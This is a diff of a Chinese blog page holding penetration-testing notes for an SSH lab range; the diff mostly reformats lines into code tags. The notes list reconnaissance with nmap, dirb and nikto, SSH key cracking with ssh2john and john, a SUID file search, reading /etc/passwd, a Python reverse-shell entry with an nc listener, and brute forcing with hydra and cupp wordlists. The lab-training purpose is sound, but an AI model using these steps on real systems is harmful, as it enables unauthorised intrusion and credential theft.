@@ -175,7 +175,7 @@
             
             <span class="tag">
                 
-                <a href="/tags/SSH/" style="color: #03a9f4">SSH</a>
+                <a href="/tags/SSH/" style="color: #00bcd4">SSH</a>
             </span>
             
         </span>
@@ -183,49 +183,47 @@
     </div>
     
     <div class="content" v-pre>
-        <p>探测端口:nmap -sV ip</p>
-<p>访问:<a href="http://ip:port/" rel="external nofollow noreferrer">http://ip:port/</a></p>
-<p>隐藏文件探测:dirb <a href="http://ip:port/" rel="external nofollow noreferrer">http://ip:port/</a></p>
-<p>登入远程文件(ssh):</p>
-<p>1.查看文件权限:ls -alh</p>
-<p>2.登陆服务器:ssh -i id_rsa 用户名@主机地址</p>
-<p>3.赋读写权限:chmod 600 id_rsa</p>
-<p>4.转换密钥为john可识别信息:ssh2john ida_isa &gt;isacrack</p>
-<p>5.利用字典解密isacrack信息:zcat &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt.gz | john –pipe –rules isacrack</p>
-<p>6.切换到根目录:cd &#x2F;root</p>
-<p>7.查找具有root权限的文件:find &#x2F; -perm -4000 2&gt;&#x2F;dev&#x2F;null</p>
-<ol start="8">
-<li>通过数组溢出提权</li>
-</ol>
+        <p><code>探测端口:nmap -sV ip</code></p>
+<p><code>访问:http://ip:port/</code></p>
+<p><code>隐藏文件探测:dirb http://ip:port/</code></p>
+<p><code>登入远程文件(ssh):</code></p>
+<p><code>1.查看文件权限:ls -alh</code></p>
+<p><code>2.登陆服务器:ssh -i id_rsa 用户名@主机地址</code></p>
+<p><code>3.赋读写权限:chmod 600 id_rsa</code></p>
+<p><code>4.转换密钥为john可识别信息:ssh2john ida_isa &gt;isacrack</code></p>
+<p><code>5.利用字典解密isacrack信息:zcat /usr/share/wordlists/rockyou.txt.gz | john --pipe --rules isacrack</code></p>
+<p><code>6.切换到根目录:cd /root</code></p>
+<p><code>7.查找具有root权限的文件:find / -perm -4000 2&gt;/dev/null</code></p>
+<p><code>8.通过数组溢出提权</code></p>
 <p><img src="https://gitee.com/liqingdi437/my_blog_images/raw/master/imgs/202309180003212.jpg" alt="ssh1"></p>
 <p><img src="https://gitee.com/liqingdi437/my_blog_images/raw/master/imgs/202309180003877.jpg" alt="ssh2"></p>
 <h1 id="ssh协议介绍"><a href="#ssh协议介绍" class="headerlink" title="ssh协议介绍"></a>ssh协议介绍</h1><p>SSH为Secure Shell的缩写,由IETF的网络小组(Network Working Group)所制定;SSH为建立在应用层基础的安全协议｡</p>
 <p>SSH是目前较可靠,专为远程登录会话和其他网络服务提供安全性的协议｡利用SSH协议可以有效防止远程管理过程中的信息泄露问题｡</p>
 <h1 id="基于TCP-22号端口的服务"><a href="#基于TCP-22号端口的服务" class="headerlink" title="基于TCP 22号端口的服务"></a><strong>基于TCP 22号端口的服务</strong></h1><h2 id="SSH协议认证机制"><a href="#SSH协议认证机制" class="headerlink" title="SSH协议认证机制"></a><strong>SSH协议认证机制</strong></h2><h3 id="基于口令的安全验证"><a href="#基于口令的安全验证" class="headerlink" title="基于口令的安全验证"></a><strong>基于口令的安全验证</strong></h3><h3 id="基于密钥的安全验证"><a href="#基于密钥的安全验证" class="headerlink" title="基于密钥的安全验证"></a><strong>基于密钥的安全验证</strong></h3><p>ida_rsa就是你的密钥,ida_rsa.pub则是你的公钥</p>
-<h2 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a><strong>信息探测</strong></h2><p>探测靶场开放的服务与服务版本:nmap -sV 靶场IP地址</p>
-<p>探测靶场全部信息:nmap -A -v 靶场IP地址</p>
-<p>探测靶场的操作系统类型与版本:nmap -O 靶场IP地址</p>
+<h2 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a><strong>信息探测</strong></h2><p><code>探测靶场开放的服务与服务版本:nmap -sV 靶场IP地址</code></p>
+<p><code>探测靶场全部信息:nmap -A -v 靶场IP地址</code></p>
+<p><code>探测靶场的操作系统类型与版本:nmap -O 靶场IP地址</code></p>
 <h2 id="分析探测结果"><a href="#分析探测结果" class="headerlink" title="分析探测结果"></a><strong>分析探测结果</strong></h2><p>对于SSH服务的22端口的靶场,首先考虑:</p>
-<p>1.暴力破解</p>
-<p>2.私钥泄露(私钥有没有对应的密码,是否可以找到私钥的用户名)</p>
-<p>对于开放的http服务的80端口或者其他端口的靶场,首先考虑:</p>
-<p>1.通过浏览器访问对应的靶场http服务,如http:&#x2F;&#x2F;靶场IP地址:http服务端口</p>
-<p>2.使用探测工具对http的目录进行探测,如dirb http:&#x2F;&#x2F;靶场IP地址:http服务端口&#x2F;</p>
-<p>特别注意 特殊端口(大于1024的端口)</p>
-<p>使用nikto扫描器来挖掘敏感信息:nikto -host 靶场IP地址</p>
-<p>特别注意config等特殊敏感文件</p>
-<p>删除文件:rm 文件名</p>
-<p>下载网页文件:wget “<a target="_blank" rel="noopener external nofollow noreferrer" href="http://ip/%E8%B7%AF%E5%BE%84/%E6%96%87%E4%BB%B6%E2%80%9D">http://ip/路径/文件”</a></p>
-<p>pwd:当前目录</p>
+<p><code>1.暴力破解</code></p>
+<p><code>2.私钥泄露(私钥有没有对应的密码,是否可以找到私钥的用户名)</code></p>
+<p><code>对于开放的http服务的80端口或者其他端口的靶场,首先考虑:</code></p>
+<p><code>1.通过浏览器访问对应的靶场http服务,如http://靶场IP地址:http服务端口</code></p>
+<p><code>2.使用探测工具对http的目录进行探测,如dirb http://靶场IP地址:http服务端口/</code></p>
+<p><code>特别注意 特殊端口(大于1024的端口)</code></p>
+<p><code>使用nikto扫描器来挖掘敏感信息:nikto -host 靶场IP地址</code></p>
+<p><code>特别注意config等特殊敏感文件</code></p>
+<p><code>删除文件:rm 文件名</code></p>
+<p><code>下载网页文件:wget “http://ip/路径/文件”</code></p>
+<p><code>pwd:当前目录</code></p>
 <h2 id="扩大战果"><a href="#扩大战果" class="headerlink" title="扩大战果"></a>扩大战果</h2><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>登录服务器后</p>
-<p>1,查看当前用户whoami</p>
-<p>2,id查看当前用户的权限</p>
-<p>3,查看根目录寻找flag文件</p>
-<p>如果是root权限,那么表明这个靶场就被全部拿下｡但是如果不是,就肯定需要提权｡一般情况下,flag文件只属于root用户和对应的用户组;</p>
-<p>查看所有的列表:Cat &#x2F;etc&#x2F;passwd</p>
-<p>查看用户组:cat &#x2F;etc&#x2F;group</p>
-<p>查看属于某些用户的文件:find &#x2F; -user 用户名</p>
-<p>查看缓冲文件目录:&#x2F;tmp</p>
+<p><code>1,查看当前用户whoami</code></p>
+<p><code>2,id查看当前用户的权限</code></p>
+<p><code>3,查看根目录寻找flag文件</code></p>
+<p><code>如果是root权限,那么表明这个靶场就被全部拿下｡但是如果不是,就肯定需要提权｡一般情况下,flag文件只属于root用户和对应的用户组;</code></p>
+<p><code>查看所有的列表:Cat /etc/passwd</code></p>
+<p><code>查看用户组:cat /etc/group</code></p>
+<p><code>查看属于某些用户的文件:find / -user 用户名</code></p>
+<p><code>查看缓冲文件目录:/tmp</code></p>
 <h2 id="深入挖掘"><a href="#深入挖掘" class="headerlink" title="深入挖掘"></a>深入挖掘</h2><p>反弹shell</p>
 <table>
 <thead>
@@ -261,13 +259,13 @@
 <td><code>p=subprocess.call([＂/bin/sh＂,＂-i＂])</code></td>
 </tr>
 </tbody></table>
-<p>攻击机netcat命令:nc -lpv 未占用的端口</p>
-<p>查看占用的端口:netstat -pantu</p>
+<p><code>攻击机netcat命令:nc -lpv 未占用的端口</code></p>
+<p><code>查看占用的端口:netstat -pantu</code></p>
 <h2 id="背水一战"><a href="#背水一战" class="headerlink" title="背水一战"></a>背水一战</h2><p>万不得已的时候,只能对ssh服务进行暴力破解｡破解最后一个用户名｡破解工具如hydra,medusa等;</p>
 <p>利用cupp创建字典</p>
-<p>Git clone <a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/jeanphorn/common-password.git">https://github.com/jeanphorn/common-password.git</a></p>
-<p>chmod +x cupp.py 可执行文件的赋予</p>
-<p>.&#x2F;cupp.py -i 以交互的方式创建字典</p>
+<p><code>Git clone https://github.com/jeanphorn/common-password.git</code></p>
+<p><code>chmod +x cupp.py 可执行文件的赋予</code></p>
+<p><code>./cupp.py -i 以交互的方式创建字典</code></p>
 <p><img src="https://gitee.com/liqingdi437/my_blog_images/raw/master/imgs/202309180003065.jpg" alt="ssh3"></p>
 <p>优化会话</p>
 <p><code>Python -c ＂import pty;pty.spawn(＇/bin/bash＇)＂</code></p>
